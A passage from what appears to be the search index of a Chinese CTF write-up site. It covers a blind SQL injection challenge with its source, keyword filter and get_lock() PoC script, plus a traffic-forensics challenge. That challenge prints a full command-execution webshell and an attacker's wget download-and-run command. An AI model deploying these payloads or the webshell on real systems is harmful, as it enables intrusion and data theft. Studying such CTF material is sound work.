( \" $hack detected!Do not want to get flag!!<br>\" ); } return $value ; } ?> index.php <?php include 'config.php' ; error_reporting ( 0 ); $conn = new mysqli ( $servername , $username , $password , $dbname ); if ( $conn -> connect_error ) { die ( \"\u8fde\u63a5\u5931\u8d25: \" ); } $sql = \"SELECT COUNT(*) FROM users\" ; $whitelist = array (); $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); $whitelist = range ( 1 , $row [ 'COUNT(*)' ]); } if ( ! empty ( $_GET [ 'id' ])){ $id = stop_hack ( $_GET [ 'id' ]); $sql = \"SELECT * FROM users WHERE id= $id \" ; if ( ! in_array ( $id , $whitelist )) { die ( \"id $id is not in whitelist.\" ); } $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); foreach ( $row as $key => $value ) { if ( preg_match ( \"/scuctf{.+?}/i\" , $value )){ die ( \"scuctf is found!!\" ); } } echo \"<center><table border='5'>\" ; foreach ( $row as $key => $value ) { echo \"<tr><td><center> $key </center></td><br>\" ; echo \"<td><center> $value </center></td></tr><br>\" ; } echo \"</table></center>\" ; } else { echo \"what do you want do??\" ; } } else { echo \"Please input id!\" ; } ?> \u5efa\u8868 sql \u6587\u4ef6 create database scuctf ; use scuctf ; create table users ( id int ( 6 ) unsigned auto_increment primary key , name varchar ( 20 ) not null , email varchar ( 30 ) not null , salary int ( 8 ) unsigned not null ); INSERT INTO users VALUES ( 1 , 'GodHuang' , 'GodHuang@scuctf.com' , 3000 ); INSERT INTO users VALUES ( 2 , 'GodSun' , 'GodSun@scuctf.com' , 4500 ); INSERT INTO users VALUES ( 3 , 'CaiJiWo' , 'CaiJiWo@scuctf.com' , 2700 ); INSERT INTO users VALUES ( 4 , 'GodWu' , 'GodWu@scuctf.com' , 10000 ); INSERT INTO users VALUES ( 5 , 'GodPang' , 'GodPang@scuctf.com' , 6000 ); create table flag ( guess varchar ( 20 ) not null , fffffffl11lgg varchar ( 30 ) not null , secert varchar ( 30 ) not null , flag varchar ( 30 ) not null ); INSERT INTO flag VALUES ( 'what happened?' , 'scuctf{3q1i_i3_t0o_e43y}' , 'I can not tell you!' , 'I am not flag Hhhhhhh!!' ); \u8fc7\u6ee4\u5982\u4e0b\uff1a $pattern =\" insert|delete|bool|extractvalue| rand|group|geometrycollection|multipoint| multipolygon|regexp|linestring| multilinestring|name_const|right|char| benchmark|polygon|char|rlike|concat|rpad| repeat|sleep|ascii|innodb|and|if|exp| updatexml|left|pow|concat_ws|group_concat| substr|join|floor|\\.\\.\\/|\\.\\/|into| load_file|outfile|dumpfile|sub|hex| file_put_contents|fwrite|curl|system| | eval\"; \u8fd9\u9053\u9898\u6211\u51fa\u9898\u7684\u65f6\u5019\uff0c\u53c2\u8003\u4e86\u5f88\u591a\u5927\u725b\u7684\u535a\u5ba2\u6587\u7ae0\uff0c\u5173\u95ed\u4e86\u62a5\u9519\u63d0\u793a\u548c\u7edd\u5927\u90e8\u5206\u65f6\u95f4\u76f2\u6ce8\u51fd\u6570(\u53ef\u80fd\u6709\u9057\u6f0f\u7684) \u4f46\u6211\u5374\u7559\u4e0b\u4e86 get_lock()\u51fd\u6570 \u9898\u76ee\u4e0a\u7ebf\u524d\uff0c\u6211\u628a or \u548c and \u6b63\u5219\u5339\u914d\u8fc7\u6ee4\u4e86\uff0c\u5bfc\u81f4\u4e0d\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 information \u6765\u67e5\u8be2\u8868\u548c\u5b57\u6bb5\u540d \u4f46\u4e0a\u7ebf\u540e\u51fa\u4e86\u70b9\u95ee\u9898\uff0cor \u548c and \u5b9e\u9645\u4e0a\u6ca1\u6709\u8fc7\u6ee4\u6389\uff08\u8fd9\u662f\u7b2c\u4e8c\u5929\u624d\u53d1\u73b0\u7684\uff09\uff0c\u5e76\u4e14\u6700\u91cd\u8981\u7684\u662f\u6ca1\u6709\u5168\u5b57\u5339\u914d\uff0c\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5 select * from flag \u5168\u67e5\u51fa\u6765\uff01\u4e8e\u662f\u8d76\u7d27\u4e0b\u7ebf\uff0c\u52a0\u5165\u4e86\u6b63\u5219\u5339\u914d foreach ($row as $key => $value) { if(preg_match(\"/scuctf{.+?}/i\",$value)){ die(\"scuctf is found!!\"); } } \u4e0d\u53ef\u4ee5\u5f53\u524d\u9875\u9762\u76f4\u63a5\u6ce8\u5165\u51fa\u6765 scuctf{}\u6574\u4e2a\u5b57\u6bb5\u4e86\uff0c\u53ea\u80fd\u76f2\u6ce8\u4e00\u4e2a\u4e2a\u8dd1\u4e86 \u6240\u4ee5\u6211\u7684\u6574\u4f53\u601d\u8def\u662f\uff0c\u901a\u8fc7\u5b50\u67e5\u8be2\u6765\u4e0d\u77e5\u5b57\u6bb5\u540d\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97 fffffffl11lgg \u7684\u503c \u8868\u540d\u5f97\u81ea\u5df1\u731c\uff0c\u4f46 CTF \u6bd4\u8d5b\u4e2d\uff0c\u4e00\u822c\u90fd\u662f flag,user,ctf \u4e4b\u7c7b\u7684 \u5b50\u67e5\u8be2\u601d\u8def\uff1a https://nosec.org/home/detail/2245.html \u76f2\u6ce8\u5177\u4f53\u65b9\u6cd5\u5f88\u591a\uff0c\u6211 POC \u91c7\u7528\u7684\u662f get_lock()\u51fd\u6570 \u5177\u4f53\u7528\u6cd5\u5982\u4e0b\uff1a https://xz.aliyun.com/t/2288 \uff08\u5410\u69fd\u4e00\u4e0b\u534f\u4f1a\u670d\u52a1\u5668\u6027\u80fd\u597d\u7684\u4e00\u6279\uff0c\u6b63\u5219\u5ef6\u8fdf\u6ce8\u5165\u79d2\u56de\uff0c\u5ef6\u8fdf\u4e0d\u4e86\u51e0\u79d2) \u4f46\u8fd9\u91cc\u7b2c\u4e8c\u5929\u53d1\u73b0 or \u548c and \u88ab\u653e\u51fa\u6765\u4e86\uff0c\u5f53\u65f6\u5f88\u60ca\u8bb6\uff0c\u672c\u6253\u7b97\u6539\u6765\u7740\uff0c\u4f46\u770b\u5230\u5230\u7b2c\u4e8c\u5929\u4e0b\u5348\u4e3a\u6b62\u4e5f\u6ca1\u51e0\u4e2a\u4eba\u505a\u51fa\u6765\uff0c\u5c31\u4e0d\u6253\u7b97\u6539\u4e86\uff0c\u5c31\u5f53\u964d\u4f4e\u96be\u5ea6\u4e86 \u6240\u4ee5\u8bf4\u8fd9\u9053\u9898\u5982\u679c\u6309\u6211\u539f\u5148\u7684\u51fa\u9898\u601d\u8def\u6765\u770b\u7684\u8bdd\uff0c\u7684\u786e\u6bd4\u8f83\u96be\uff0c\u6bd5\u7adf\u5dee\u4e0d\u591a\u5f53\u534a\u4e2a\u538b\u8f74\u7684\uff0c\u4f46\u51fa\u4e86\u95ee\u9898\u4e4b\u540e\uff0c\u96be\u5ea6\u4f4e\u4e86\u5f88\u591a\uff0c\u7ec6\u5fc3\u7422\u78e8\u505a\u4e00\u4e0b\u7684\u8bdd\uff0c\u8fd8\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684~ \u8fd9\u91cc\u8d34\u4e00\u4e0b\u6211\u539f\u5148\u7684 poc \u811a\u672c\uff0c\u4f30\u8ba1\u73b0\u5728\u4e0d\u53ef\u7528\u4e86\uff0c\u65b0\u7684 poc \u53ef\u4ee5\u770b\u770b\u505a\u51fa\u6765\u961f\u4f0d\u7684\u6216\u8005\u7b49\u6211\u6709\u65f6\u95f4\u5199\uff08\u6700\u8fd1\u592a\u5fd9\u4e86~\uff09 import requests import string dic = string . digits + string . ascii_letters + \"!@#$%^&*()_+ {} -=\" url = \"http://47.96.138.65:45787/?id=1\" session = requests . session () def flag (): i = 1 flag = \"\" while True : for j in dic : try : payoad = \"/**/ %26% 26/**/mid((select/**/`2`/**/from/**/(select/**/1,2,3,4/**/\" \\ \"union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1), {} ,1)=' {} '/**/\" \\ \" %26% 26/**/get_lock('ddog',5)\" . format ( i , j ) url_all = url + payoad t = session . get ( url = url_all , timeout = 3 ) . content print ( t ) if len ( t ) != 0 : print (( \"[*]Flag:\" + flag ) . replace ( \"#&+\" , \"\" )) flag = flag + j except Exception : pass i = i + 1 if __name__ == \"__main__\" : flag ()","title":"BabySqli"},{"location":"WriteUp/201905/Web/#_16","text":"\u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u6b21\u6211\u51fa\u7684\u9898\uff0c\u9664\u4e86 Sqli \u6709\u70b9\u5c0f\u96be\u4ee5\u5916\u5176\u4ed6\u4e24\u9053\u9898\u96be\u5ea6\u8fd8\u662f\u53ef\u4ee5\u7684\uff0c\u5fc3\u6001\u653e\u597d\u4ed4\u7ec6\u505a\u7684\u8bdd\uff0c\u63a5\u5927\u591a\u6570\u4eba\u8fd8\u662f\u53ef\u4ee5\u5728\u8fd9\u4e09\u9053\u9898\u62ff\u5230 480 \u5206\uff0c\u5bf9\u4e8e\u6211\u521a\u624d\u63d0\u5230\u7684 BabySqli \u7684\u539f\u6709\u601d\u8def\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u73af\u5883\u6d4b\u8bd5\u4e00\u4e0b\u505a\u9898\u601d\u8def\uff0c\u8fd9\u4e24\u5929\u5927\u5bb6\u4e5f\u505a\u9898\u8f9b\u82e6\u4e86\u54c8~","title":"\u51fa\u9898\u4eba\u5bc4\u8bed"},{"location":"WriteUp/202005/Misc/","text":"Misc \u00b6 APU\u7684\u72af\u7f6a\u8bc1\u636e \u00b6 \u51fa\u9898\u58ec\u4e34\u65f6\u8d77\u610f\uff0c\u5f04\u4e86\u4e2a\u7b80\u5355\u5730\u7f1d\u5408\u4e86misc,crypto,re,web\u7684\u9898\u76ee\u3002\u672c\u9898\u7684\u80cc\u666f\u662f\u6a21\u62df\u9ed1\u5ba2\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u7684\u6d41\u91cf\uff0c\u6709\u4e00\u5b9a\u7684\u5b9e\u9645\u610f\u4e49(\u81ea\u5356\u81ea\u5938ing)\u3002 \u9996\u5148\u4e0b\u8f7d\u6d41\u91cf\u5305\uff0c\u5f04\u4e2ahttp\u7684\u8fc7\u6ee4\u53c2\u6570\uff0c\u770b\u5230\u4e00\u5806http\u5305 \u63a5\u7740\u70b9\u5f00\u90a3\u4e2aPOST\u5305\uff0c\u53d1\u73b0\u662f\u4e0a\u4f20webshell \u5c31\u53ef\u4ee5\u53d1\u73b0webshell\u957f\u8fd9\u6837 <?php session_start (); function fastpow ( $a , $b , $c ) { if ( $b == 0 ) return 1 ; $res = fastpow ( $a , intval ( $b / 2 ), $c ); if ( $b % 2 ) return $res * $res * $a % $c ; return $res * $res % $c ; } if ( ! isset ( $_SESSION [ 'p' ])) { $_SESSION [ 'p' ] = rand ( 1 , 255 ); $_SESSION [ '.' ] = rand ( 5 , 10 ); $_SESSION [ 'ra' ] = rand ( 50 , 100 ); $Sa = fastpow ( $_SESSION [ '.' ], $_SESSION [ 'ra' ], $_SESSION [ 'p' ]); printf ( \"%d,%d,%d\" , $_SESSION [ 'p' ], $_SESSION [ '.' ], $Sa ); die (); } if ( ! isset ( $_SESSION [ 'key' ])) { $_SESSION [ 'key' ] = fastpow ( $_GET [ 'sb' ], $_SESSION [ 'ra' ], $_SESSION [ 'p' ]); die (); } $code = $_REQUEST [ 'code' ]; $cmd = '' ; for ( $i = 0 ; $i < strlen ( $_REQUEST [ 'code' ]); $i ++ ) { $cmd .= chr ( ord ( $_REQUEST [ 'code' ][ $i ]) ^ $_SESSION [ 'key' ]); } ob_start (); system ( $cmd ); $res = ob_get_contents (); ob_end_clean (); for ( $i = 0 ; $i < strlen ( $res ); $i ++ ) { echo chr ( ord ( $res [ $i ]) ^ $_SESSION [ 'key' ]); } \u8fd9\u4e2awebshell\u4e5f\u662f\u51fa\u9898\u58ec\u4e34\u65f6\u8d77\u610f\u5199\u7684\uff0c\u4e0a\u5348\u505a\u89c5\u9a6c\u5b66\u4f5c\u4e1a\u6765\u7684\u7075\u611f\u3002 \u8fd9\u4e2awebshell\u4f7f\u7528\u4e86diffie-hellman\u5bc6\u94a5\u4ea4\u6362\u534f\u8bae\uff0c\u4f7f\u5f97\u88ab\u52a8\u76d1\u542c\u8005\u65e0\u6cd5\u76f4\u63a5\u62ff\u5230\u6d41\u91cf\u3002\u4f46\u662f\u5bc6\u94a5\u8fc7\u5f31\uff0c\u662f1-255\uff0c\u975e\u5e38\u5bb9\u6613\u7206\u7834 \u7f16\u5199\u811a\u672c\u8fdb\u884c\u7206\u7834 import urllib.parse cipher = urllib . parse . unquote ( 'ez%7Ds %7F %7B' ) def xor ( i ): return '' . join ([ chr ( ord ( c ) ^ i ) for c in cipher ]) for i in range ( 1 , 256 ): print ( i ) print ( xor ( i )) \u8fc7\u7a0b\u4e0d\u622a\u56fe\u4e86\uff0ci\u4e3a18\u7684\u65f6\u5019\u7ed3\u679c\u662fwhoami\uff0c\u6240\u4ee5\u5bc6\u94a5\u4e3a18\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u6d41\u91cf\u4e86\u3002 \u63a5\u7740\u53ef\u4ee5\u5728\u6d41\u91cf\u91cc\u9762\u53d1\u73b0\u653b\u51fb\u8005\u7528webshell\u6267\u884c\u4e86\u4e00\u4e2a\u547d\u4ee4 wget \"http://pan-yz.chaoxing.com/download/downloadfile?fleid=471314960076619776&puid=117048149\" -U \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\" -O a \u8ba9\u53d7\u63a7\u673a\u4ece\u8d85\u661f\u670d\u52a1\u5668\u4e0a\u9762\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6267\u884c\u3002\u6ce8\u610f\uff0c\u8fd9\u5728\u771f\u5b9e\u7684\u5165\u4fb5\u4e2d\u4e5f\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u624b\u6bb5\uff0c\u653b\u51fb\u8005\u5f80\u5f80\u4f1a\u91c7\u53d6\u5404\u79cd\u516c\u5f00\u7684\u57fa\u7840\u8bbe\u65bd\u6765\u6258\u7ba1\u81ea\u5df1\u7684\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e00\u4e9b\u57fa\u4e8e\u9ed1\u540d\u5355\u9632\u62a4\u7684\u6d41\u91cf\u76d1\u63a7\u8bbe\u5907,\u5b9e\u73b0\u9690\u85cf\u81ea\u8eab\u7684\u76ee\u7684 (\u7531\u4e8e\u51fa\u9898\u58ec\u7684\u5931\u8bef,\u8fd9\u4e2aURL\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u6d41\u91cf\u5305\u91cc\u9762\u627e\u5230,\u6211\u9519\u4e86\u6211\u81ea\u88c1) \u597d\u7684,\u6211\u4eec\u4ece\u8fd9\u4e2aURL\u4e0b\u8f7d\u6587\u4ef6,\u7136\u540e\u62d6\u5165IDA,\u53d1\u73b0\u5c31\u662f\u8bfb\u53d6flag,\u7f16\u7801\u540e\u8f93\u51fa \u8ddf\u8fdb\u8fd9\u4e2aencode_string\u51fd\u6570 \u53d1\u73b0\u662f\u4e2a\u53d8\u79cdbase64\u52a0\u5bc6,\u5bc6\u7801\u8868\u5728chlist\u91cc\u9762 (\u5f88\u8bda\u5b9e\u5730\u8bb2,\u51fa\u9898\u58ec\u5728\u51fa\u9898\u7684\u65f6\u5019\u8054\u7cfb\u4e86@Minhal \u6765\u5199\u8fd9\u4e2a\u7a0b\u5e8f,\u81f3\u4e8e\u8be5\u600e\u4e48\u770b\u51fa\u8fd9\u662fbase64,\u5766\u767d\u6765\u8bf4,\u4f5c\u4e3a\u4e00\u4e2aweb\ud83d\udc15\u6211\u4e5f\u4e0d\u77e5\u9053) \u70b9\u5f00chlist\u67e5\u770b\u5bc6\u7801\u8868 \u63a5\u7740\u6839\u636e\u6d41\u91cf\u91cc\u9762\u7684\u5bf9\u5e94\u5185\u5bb9\u7f16\u5199\u89e3\u5bc6\u811a\u672c (\u8be5\u811a\u672c\u7531@lcx\u8d21\u732e,\u611f\u8c22\u4ed6) s = 'NOPQRSABCDEFGHIa23156bcdefgJKLMT7894VWXYZhijklmnopqrstuvwxyz0+/' dest = 'KuHtev3XMu8WJW+ZfcxTecS8ecS8ecS8ecS8ecS8ecS8edsE' i = 0 flag = '' while i < len ( dest ): temp = s . index ( dest [ i ]) << ( 6 * 3 ) temp += ( s . index ( dest [ i + 1 ]) << ( 6 * 2 )) temp += ( s . index ( dest [ i + 2 ]) << ( 6 * 1 )) temp += ( s . index ( dest [ i + 3 ]) << ( 6 * 0 )) flag += chr (( temp >> 16 ) & 0xff ) flag += chr (( temp >> 8 ) & 0xff ) flag += chr ( temp & 0xff ) i += 4 print ( flag ) \u8fd0\u884c\u51faflag \u4e13\u4e1a\u56e2\u961f \u00b6 \u6211\u624d\u4e0d\u4f1a\u544a\u8bc9\u4f60\u4eec\u662f\u51fa\u9898\u4eba\u9009\u9519\u4e86\u538b\u7f29\u7b97\u6cd5\u624d\u8ba9\u8fd9\u4e2a\u9898\u8fd9\u4e48\u7b80\u5355 \u539f\u672c\u7684\u60f3\u6cd5 \u00b6 PNG\u6587\u4ef6\u7684IDAT\u5757\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\uff0c\u4ece\u4e0a\u5f80\u4e0b\u9664\u4e86\u6700\u540e\u4e00\u4e2aIDAT\u5757\u53ef\u80fd\u6bd4\u8f83\u5c0f\uff0c\u5176\u5b83\u5e94\u8be5\u90fd\u662f\u4e00\u6837\u5927\u7684\u3002\u4f46\u662f\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u5012\u6570\u7b2c\u4e8c\u4e2aIDAT\u5757\u5927\u5c0f\u4e0d\u5bf9\uff0c\u5e94\u8be5\u6709\u9690\u85cf\u4fe1\u606f \u5927\u5bb6\u7684\u89e3\u6cd5 \u00b6 \u76f4\u63a5binwalk\u51fagz\u538b\u7f29\u5305\uff0c\u89e3\u538b\u83b7\u5f97flag \u5047\u7684\u7b7e\u5230 \u00b6 /gamemode 3 \u8fdb\u89c2\u5bdf\u8005\u6a21\u5f0f\uff0c\u5c31\u80fd\u770b\u5230\u5730\u4e0b\u7684\u7a7a\u6d1e\uff08\u8fd8\u63d2\u7740\u706b\u628a\uff09","title":"Misc"},{"location":"WriteUp/202005/Misc/#misc","text":"","title":"Misc"},{"location":"WriteUp/202005/Misc/#apu","text":"\u51fa\u9898\u58ec\u4e34\u65f6\u8d77\u610f\uff0c\u5f04\u4e86\u4e2a\u7b80\u5355\u5730\u7f1d\u5408\u4e86misc,crypto,re,web\u7684\u9898\u76ee\u3002\u672c\u9898\u7684\u80cc\u666f\u662f\u6a21\u62df\u9ed1\u5ba2\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u7684\u6d41\u91cf\uff0c\u6709\u4e00\u5b9a\u7684\u5b9e\u9645\u610f\u4e49(\u81ea\u5356\u81ea\u5938ing)\u3002 \u9996\u5148\u4e0b\u8f7d\u6d41\u91cf\u5305\uff0c\u5f04\u4e2ahttp\u7684\u8fc7\u6ee4\u53c2\u6570\uff0c\u770b\u5230\u4e00\u5806http\u5305 \u63a5\u7740\u70b9\u5f00\u90a3\u4e2aPOST\u5305\uff0c\u53d1\u73b0\u662f\u4e0a\u4f20webshell \u5c31\u53ef\u4ee5\u53d1\u73b0webshell\u957f\u8fd9\u6837 <?php session_start (); function fastpow ( $a , $b , $c ) { if ( $b == 0 ) return 1 ; $res = fastpow ( $a , intval ( $b / 2 ), $c ); if ( $b % 2 ) return $res * $res * $a % $c ; return $res * $res % $c ; } if ( ! isset ( $_SESSION [ 'p' ])) { $_SESSION [ 'p' ] = rand ( 1 , 255 ); $_SESSION [ '.' ] = rand ( 5 , 10 ); $_SESSION [ 'ra' ] = rand ( 50 , 100 ); $Sa = fastpow ( $_SESSION [ '.' ], $_SESSION [ 'ra' ], $_SESSION [ 'p' ]); printf ( \"%d,%d,%d\" , $_SESSION [ 'p' ], $_SESSION [ '.' ], $Sa ); die (); } if ( ! isset ( $_SESSION [ 'key' ])) { $_SESSION [ 'key' ] = fastpow ( $_GET [ 'sb' ], $_SESSION [ 'ra' ], $_SESSION [ 'p' ]); die (); } $code = $_REQUEST [ 'code' ]; $cmd = '' ; for ( $i = 0 ; $i < strlen ( $_REQUEST [ 'code' ]); $i ++ ) { $cmd .= chr ( ord ( $_REQUEST [ 'code' ][ $i ]) ^ $_SESSION [ 'key' ]); } ob_start (); system ( $cmd ); $res = ob_get_contents (); ob_end_clean (); for ( $i = 0 ; $i < strlen ( $res ); $i ++ ) { echo chr ( ord ( $res [ $i ]) ^ $_SESSION [ 'key' ]); } \u8fd9\u4e2awebshell\u4e5f\u662f\u51fa\u9898\u58ec\u4e34\u65f6\u8d77\u610f\u5199\u7684\uff0c\u4e0a\u5348\u505a\u89c5\u9a6c\u5b66\u4f5c\u4e1a\u6765\u7684\u7075\u611f\u3002 \u8fd9\u4e2awebshell\u4f7f\u7528\u4e86diffie-hellman\u5bc6\u94a5\u4ea4\u6362\u534f\u8bae\uff0c\u4f7f\u5f97\u88ab\u52a8\u76d1\u542c\u8005\u65e0\u6cd5\u76f4\u63a5\u62ff\u5230\u6d41\u91cf\u3002\u4f46\u662f\u5bc6\u94a5\u8fc7\u5f31\uff0c\u662f1-255\uff0c\u975e\u5e38\u5bb9\u6613\u7206\u7834 \u7f16\u5199\u811a\u672c\u8fdb\u884c\u7206\u7834 import urllib.parse cipher = urllib . parse . unquote ( 'ez%7Ds %7F %7B' ) def xor ( i ): return '' . join ([ chr ( ord ( c ) ^ i ) for c in cipher ]) for i in range ( 1 , 256 ): print ( i ) print ( xor ( i )) \u8fc7\u7a0b\u4e0d\u622a\u56fe\u4e86\uff0ci\u4e3a18\u7684\u65f6\u5019\u7ed3\u679c\u662fwhoami\uff0c\u6240\u4ee5\u5bc6\u94a5\u4e3a18\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u6d41\u91cf\u4e86\u3002 \u63a5\u7740\u53ef\u4ee5\u5728\u6d41\u91cf\u91cc\u9762\u53d1\u73b0\u653b\u51fb\u8005\u7528webshell\u6267\u884c\u4e86\u4e00\u4e2a\u547d\u4ee4 wget \"http://pan-yz.chaoxing.com/download/downloadfile?fleid=471314960076619776&puid=117048149\" -U \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0\" -O a \u8ba9\u53d7\u63a7\u673a\u4ece\u8d85\u661f\u670d\u52a1\u5668\u4e0a\u9762\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6267\u884c\u3002\u6ce8\u610f\uff0c\u8fd9\u5728\u771f\u5b9e\u7684\u5165\u4fb5\u4e2d\u4e5f\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u624b\u6bb5\uff0c\u653b\u51fb\u8005\u5f80\u5f80\u4f1a\u91c7\u53d6\u5404\u79cd\u516c\u5f00\u7684\u57fa\u7840\u8bbe\u65bd\u6765\u6258\u7ba1\u81ea\u5df1\u7684\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e00\u4e9b\u57fa\u4e8e\u9ed1\u540d\u5355\u9632\u62a4\u7684\u6d41\u91cf\u76d1\u63a7\u8bbe\u5907,\u5b9e\u73b0\u9690\u85cf\u81ea\u8eab\u7684\u76ee\u7684 (\u7531\u4e8e\u51fa\u9898\u58ec\u7684\u5931\u8bef,\u8fd9\u4e2aURL\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u6d41\u91cf\u5305\u91cc\u9762\u627e\u5230,\u6211\u9519\u4e86\u6211\u81ea\u88c1) \u597d\u7684,\u6211\u4eec\u4ece\u8fd9\u4e2aURL\u4e0b\u8f7d\u6587\u4ef6,\u7136\u540e\u62d6\u5165IDA,\u53d1\u73b0\u5c31\u662f\u8bfb\u53d6flag,\u7f16\u7801\u540e\u8f93\u51fa \u8ddf\u8fdb\u8fd9\u4e2aencode_string\u51fd\u6570 \u53d1\u73b0\u662f\u4e2a\u53d8\u79cdbase64\u52a0\u5bc6,\u5bc6\u7801\u8868\u5728chlist\u91cc\u9762 (\u5f88\u8bda\u5b9e\u5730\u8bb2,\u51fa\u9898\u58ec\u5728\u51fa\u9898\u7684\u65f6\u5019\u8054\u7cfb\u4e86@Minhal \u6765\u5199\u8fd9\u4e2a\u7a0b\u5e8f,\u81f3\u4e8e\u8be5\u600e\u4e48\u770b\u51fa\u8fd9\u662fbase64,\u5766\u767d\u6765\u8bf4,\u4f5c\u4e3a\u4e00\u4e2aweb\ud83d\udc15\u6211\u4e5f\u4e0d\u77e5\u9053) \u70b9\u5f00chlist\u67e5\u770b\u5bc6\u7801\u8868 \u63a5\u7740\u6839\u636e\u6d41\u91cf\u91cc\u9762\u7684\u5bf9\u5e94\u5185\u5bb9\u7f16\u5199\u89e3\u5bc6\u811a\u672c (\u8be5\u811a\u672c\u7531@lcx\u8d21\u732e,\u611f\u8c22\u4ed6) s = 'NOPQRSABCDEFGHIa23156bcdefgJKLMT7894VWXYZhijklmnopqrstuvwxyz0+/' dest = 'KuHtev3XMu8WJW+ZfcxTecS8ecS8ecS8ecS8ecS8ecS8edsE' i = 0 flag = '' while i < len ( dest ): temp = s . index ( dest [ i ]) << ( 6 * 3 ) temp += ( s . index ( dest [ i + 1 ]) << ( 6 * 2 )) temp += ( s . index ( dest [ i + 2 ]) << ( 6 * 1 )) temp += ( s . index ( dest [ i + 3 ]) << ( 6 * 0 )) flag += chr (( temp >> 16 ) & 0xff ) flag += chr (( temp >> 8 ) & 0xff ) flag += chr ( temp & 0xff ) i += 4 print ( flag ) \u8fd0\u884c\u51faflag","title":"APU\u7684\u72af\u7f6a\u8bc1\u636e"},{"location":"WriteUp/202005/Misc/#_1","text":"\u6211\u624d\u4e0d\u4f1a\u544a\u8bc9\u4f60\u4eec\u662f\u51fa\u9898\u4eba\u9009\u9519\u4e86\u538b\u7f29\u7b97\u6cd5\u624d\u8ba9\u8fd9\u4e2a\u9898\u8fd9\u4e48\u7b80\u5355","title":"\u4e13\u4e1a\u56e2\u961f"},{"location":"WriteUp/202005/Misc/#_2","text":"PNG\u6587\u4ef6\u7684IDAT\u5757\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\uff0c\u4ece\u4e0a\u5f80\u4e0b\u9664\u4e86\u6700\u540e\u4e00\u4e2aIDAT\u5757\u53ef\u80fd\u6bd4\u8f83\u5c0f\uff0c\u5176\u5b83\u5e94\u8be5\u90fd\u662f\u4e00\u6837\u5927\u7684\u3002\u4f46\u662f\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u5012\u6570\u7b2c\u4e8c\u4e2aIDAT\u5757\u5927\u5c0f\u4e0d\u5bf9\uff0c\u5e94\u8be5\u6709\u9690\u85cf\u4fe1\u606f","title":"\u539f\u672c\u7684\u60f3\u6cd5"},{"location":"WriteUp/202005/Misc/#_3","text":"\u76f4\u63a5binwalk\u51fagz\u538b\u7f29\u5305\uff0c\u89e3\u538b\u83b7\u5f97flag","title":"\u5927\u5bb6\u7684\u89e3\u6cd5"},{"location":"WriteUp/202005/Misc/#_4","text":"/gamemode 3 \u8fdb\u89c2\u5bdf\u8005\u6a21\u5f0f\uff0c\u5c31\u80fd\u770b\u5230\u5730\u4e0b\u7684\u7a7a\u6d1e\uff08\u8fd8\u63d2\u7740\u706b\u628a\uff09","title":"\u5047\u7684\u7b7e\u5230"},{"location":"WriteUp/202005/Reverse/","text":"Reverse \u00b6 \u771f\u6b63\u7684\u7b7e\u5230 \u00b6 \u51fa\u9898\u601d\u8def \u00b6 \u672c\u8eab\u4f5c\u4e3a\u7b7e\u5230\u9898\u5c31\u6ca1\u5fc5\u8981\u592a\u5201\u96be\u4eba\uff0c\u4e3b\u8981\u8003\u5bdf\u8131\u538b\u7f29\u58f3\uff08re\u9009\u624b\u57fa\u7840\u6280\u80fd\uff09\uff0c\u6b63\u597d\u57284\u6708\u7684\u8131\u58f3\u5206\u4eab\u4f1a\u4e5f\u8bf4\u4e86\u8981\u51fa\u4e00\u9053\u8fd9\u79cd\u9898\u3002\u8131\u5b8c\u58f3\u540e\u5c31\u6253\u7b97\u641e\u4e2a\u7b80\u5355\u7684\u52a0\u51cf\u4e58\u9664\uff0c\u4f46\u662f\u8fd8\u662f\u51fa\u9898\u65f6\u5019\u8003\u8651\u4e0d\u5468\uff0c\u51fa\u73b0\u4e86\u591a\u89e3\u7684\u60c5\u51b5\u3002\uff08\u6309\u7167\u6b63\u5e38\u601d\u8def\u4e00\u822c\u90fd\u662f\u4e00\u4e2a\u89e3\u3002\uff09 \u95ee\u9898\u4e3b\u8981\u51fa\u5728\u5f53\u65f6\u505a\u4e86\u4e00\u4e2a\u9664\u6cd5\u7684\u64cd\u4f5c\uff0c\u56e0\u4e3aC\u8bed\u8a00\u4e2d5/2 \u4e0e4/2\u90fd\u4e3a2\u3002 \u89e3\u9898\u65b9\u6cd5 \u00b6 \u6cd51 \u00b6 \u7b2c\u4e00\u6b65\uff0c\u67e5\u58f3\uff0c\u53d1\u73b0\u4e3aupx\u3002 \u76f4\u63a5\u53ef\u4ee5\u7528\u8131\u58f3\u8f6f\u4ef6\u8131\u58f3\u4e5f\u53efesp\u5b9a\u5f8b\u7b49\u624b\u52a8\u8131\u58f3\u3002 \u8131\u58f3\u540e\u5206\u6790\u4ee3\u7801\u3002 \u76f4\u63a5\u5199\u811a\u672c #include <stdio.h> #include <string.h> int main (){ char fstr 